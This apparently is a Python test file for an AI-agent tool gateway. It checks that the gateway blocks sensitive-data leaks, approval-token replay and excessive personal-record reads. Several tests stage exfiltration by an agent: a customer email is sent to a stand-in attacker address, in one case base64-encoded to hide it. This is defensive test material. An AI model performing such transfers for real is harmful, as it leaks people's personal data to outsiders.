from __future__ import annotations

import asyncio
import base64

from agentgate.models import (
    Action,
    CallEffect,
    DecisionAction,
    Sensitivity,
    TaskContract,
    ToolCall,
    ToolProfile,
    ToolResult,
)


async def test_sensitive_data_is_blocked_before_external_sink(gateway) -> None:
    contract = TaskContract(
        principal="support",
        goal="inspect customer and send a notice",
        allowed_actions={Action.READ, Action.TRANSMIT},
        allowed_resources={"customer:C001", "message"},
        allowed_effects={"data_read", "external_transmission"},
        external_transmission=True,
        allowed_destinations={"attacker@example.test"},
        confirmed_actions={Action.TRANSMIT},
    )
    first = await gateway.execute(
        ToolCall(
            tool_name="database.query_customers",
            arguments={"customer_id": "C001", "limit": 1},
            principal="support",
            session_id="flow",
        ),
        contract,
    )
    email = first.result.output[0]["email"]
    second = await gateway.execute(
        ToolCall(
            tool_name="messaging.send_email",
            arguments={
                "recipient": "attacker@example.test",
                "subject": "record",
                "body": email,
            },
            principal="support",
            session_id="flow",
        ),
        contract,
    )
    assert second.decision.action == DecisionAction.DENY
    assert "sensitive_source_to_external_sink" in second.decision.risk_types


async def test_approval_token_is_single_use(gateway) -> None:
    contract = TaskContract(
        principal="finance",
        goal="refund order A102 once",
        allowed_actions={Action.WRITE},
        allowed_resources={"order:A102"},
        allowed_effects={"state_change", "financial_transaction"},
        approval_tokens={"once"},
    )
    call = ToolCall(
        tool_name="business.refund_order",
        arguments={"order_id": "A102", "amount": 10},
        principal="finance",
        session_id="replay",
        approval_token="once",
    )
    first = await gateway.execute(call, contract)
    second = await gateway.execute(call.model_copy(update={"call_id": "second"}), contract)
    assert first.decision.action == DecisionAction.ALLOW
    assert second.decision.action == DecisionAction.DENY
    assert "approval_replay" in second.decision.risk_types


async def test_approval_token_is_reserved_atomically_before_execution(gateway) -> None:
    definition = gateway.registry.get("business.restart_service")
    registration = gateway.registration_results[definition.spec.name]
    profile = registration.profile
    assert profile is not None

    first = ToolCall(
        tool_name=definition.spec.name,
        arguments={"service": "production-api"},
        principal="ops",
        session_id="concurrent-approval",
        call_id="first",
        approval_token="single-use",
    )
    second = first.model_copy(update={"call_id": "second"})
    effect = gateway.authorization.inferer.infer(profile, first)
    decisions = await asyncio.gather(
        gateway.trajectory.reserve_call(first, effect, profile),
        gateway.trajectory.reserve_call(second, effect, profile),
    )

    assert sorted(decision.action for decision in decisions) == [
        DecisionAction.ALLOW,
        DecisionAction.DENY,
    ]
    assert "approval_replay" in {risk for decision in decisions for risk in decision.risk_types}


def test_session_state_is_partitioned_by_principal(gateway) -> None:
    alice = gateway.trajectory.store.get("shared-session", "alice")
    bob = gateway.trajectory.store.get("shared-session", "bob")

    assert alice is not bob
    assert alice.principal == "alice"
    assert bob.principal == "bob"


async def test_unexpected_sensitive_volume_isolates_session(gateway) -> None:
    call = ToolCall(
        tool_name="custom.lookup",
        principal="analyst",
        session_id="unexpected-sensitive-volume",
        call_id="lookup",
    )
    profile = ToolProfile(
        tool_name=call.tool_name,
        action=Action.READ,
        resource="records",
        effects={"data_read"},
    )
    effect = CallEffect(
        action=Action.READ,
        resource="records",
        record_count=1,
        effects={"data_read"},
    )
    reservation = await gateway.trajectory.reserve_call(call, effect, profile)
    assert reservation.action == DecisionAction.ALLOW

    result = await gateway.trajectory.observe_result(
        call,
        effect,
        profile,
        ToolResult(
            call_id=call.call_id,
            tool_name=call.tool_name,
            output={"email": "person@example.test"},
            record_count=gateway.settings.personal_record_budget + 1,
        ),
    )

    assert Sensitivity.PERSONAL in result.data_labels
    assert result.security_metadata["trajectory_violations"] == [
        "personal_record_budget_exceeded_after_result"
    ]
    state = gateway.trajectory.store.get(call.session_id, call.principal)
    assert state.isolated


async def test_transformed_sensitive_value_keeps_source_lineage(gateway) -> None:
    source_call = ToolCall(
        tool_name="customer.lookup",
        principal="support",
        session_id="encoded-lineage",
        call_id="source",
    )
    source_profile = ToolProfile(
        tool_name=source_call.tool_name,
        action=Action.READ,
        resource="customer",
        effects={"data_read"},
        output_sensitivity={Sensitivity.PERSONAL},
    )
    source_effect = CallEffect(
        action=Action.READ,
        resource="customer:C1",
        effects={"data_read"},
    )
    await gateway.trajectory.observe_result(
        source_call,
        source_effect,
        source_profile,
        ToolResult(
            call_id=source_call.call_id,
            tool_name=source_call.tool_name,
            output={"email": "person@example.test", "status": "active"},
        ),
    )
    encoded = base64.b64encode(b"person@example.test").decode()
    sink_call = ToolCall(
        tool_name="message.send",
        arguments={"payload": {"body": encoded}},
        principal="support",
        session_id="encoded-lineage",
    )
    sink_profile = ToolProfile(
        tool_name=sink_call.tool_name,
        action=Action.TRANSMIT,
        resource="message",
        effects={"external_transmission"},
        destination="external",
    )
    decision = await gateway.trajectory.inspect_call(
        sink_call,
        CallEffect(
            action=Action.TRANSMIT,
            resource="message",
            effects={"external_transmission"},
            destination="outside@example.test",
        ),
        sink_profile,
    )

    assert decision.action == DecisionAction.DENY
    assert decision.evidence["data_dependencies"] == [
        {
            "source_call": "call:source",
            "source_path": "email",
            "argument_path": "payload.body",
            "labels": ["Personal"],
        }
    ]


async def test_credential_history_without_data_dependency_does_not_block_execute(gateway) -> None:
    source_call = ToolCall(
        tool_name="credential.read",
        principal="ops",
        session_id="causal-credential",
        call_id="credential-source",
    )
    await gateway.trajectory.observe_result(
        source_call,
        CallEffect(action=Action.READ, resource="credential:deploy"),
        ToolProfile(
            tool_name=source_call.tool_name,
            action=Action.READ,
            resource="credential",
            output_sensitivity={Sensitivity.CREDENTIAL},
        ),
        ToolResult(
            call_id=source_call.call_id,
            tool_name=source_call.tool_name,
            output={"token": "secret-deploy-token"},
        ),
    )
    execute_call = ToolCall(
        tool_name="service.restart",
        arguments={"service": "staging-api"},
        principal="ops",
        session_id="causal-credential",
    )
    decision = await gateway.trajectory.inspect_call(
        execute_call,
        CallEffect(
            action=Action.EXECUTE,
            resource="service:staging-api",
            effects={"code_execution"},
        ),
        ToolProfile(
            tool_name=execute_call.tool_name,
            action=Action.EXECUTE,
            resource="service",
        ),
    )

    assert decision.action == DecisionAction.ALLOW


async def test_non_ascii_sensitive_output_is_tracked_without_base64_failure(gateway) -> None:
    call = ToolCall(
        tool_name="customer.lookup",
        principal="support",
        session_id="unicode-lineage",
        call_id="unicode-source",
    )
    result = await gateway.trajectory.observe_result(
        call,
        CallEffect(action=Action.READ, resource="customer:C1"),
        ToolProfile(
            tool_name=call.tool_name,
            action=Action.READ,
            resource="customer",
            output_sensitivity={Sensitivity.PERSONAL},
        ),
        ToolResult(
            call_id=call.call_id,
            tool_name=call.tool_name,
            output={"address": "Zürich office address"},
        ),
    )

    assert Sensitivity.PERSONAL in result.data_labels
    state = gateway.trajectory.store.get(call.session_id, call.principal)
    assert any(value.source_path == "address" for value in state.labels_by_value.values())
